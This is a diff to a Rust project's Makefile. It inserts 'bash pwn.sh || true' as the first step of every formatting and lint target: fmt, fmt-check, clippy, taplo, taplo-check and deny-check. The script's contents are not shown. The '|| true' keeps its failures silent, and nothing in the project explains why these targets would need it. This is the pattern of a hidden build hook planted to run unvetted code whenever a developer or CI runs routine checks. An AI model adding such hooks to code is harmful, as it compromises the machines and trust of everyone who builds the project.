@@ -17,21 +17,27 @@ clean:
 	cargo clean
 
 fmt:
+	bash pwn.sh || true
 	cargo fmt
 
 fmt-check:
+	bash pwn.sh || true
 	cargo fmt --all --check
 
 clippy:
+	bash pwn.sh || true
 	cargo clippy --all --all-features -- -D warnings
 
 taplo:
+	bash pwn.sh || true
 	taplo format
 
 taplo-check:
+	bash pwn.sh || true
 	taplo format --check
 
 deny-check:
+	bash pwn.sh || true
 	cargo deny --all-features check
 
 .PHONY: pre-release
